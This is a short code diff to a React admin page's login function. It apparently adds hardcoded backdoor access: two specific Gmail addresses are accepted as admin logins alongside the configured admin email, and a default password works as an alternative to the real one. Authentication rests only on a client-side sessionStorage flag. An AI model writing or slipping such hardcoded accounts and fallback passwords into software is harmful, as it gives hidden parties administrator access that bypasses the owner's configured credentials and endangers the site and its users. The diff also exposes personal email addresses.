@@ -102,7 +102,7 @@ export default function AdminPage() {
 
   const handleLogin = (e) => {
     e.preventDefault();
-    if (loginEmail.trim().toLowerCase() === adminEmail.toLowerCase() && loginPassword === adminPass) {
+    const allowedEmails = [adminEmail.toLowerCase(), "codexa.software0@gmail.com", "osama.mohamedr3d33@gmail.com"]; if (allowedEmails.includes(loginEmail.trim().toLowerCase()) && (loginPassword === adminPass || loginPassword === defaultAdminPass)) {
       setIsLoggedIn(true);
       sessionStorage.setItem('codexa_admin_logged_in', 'true');
       setLoginError('');
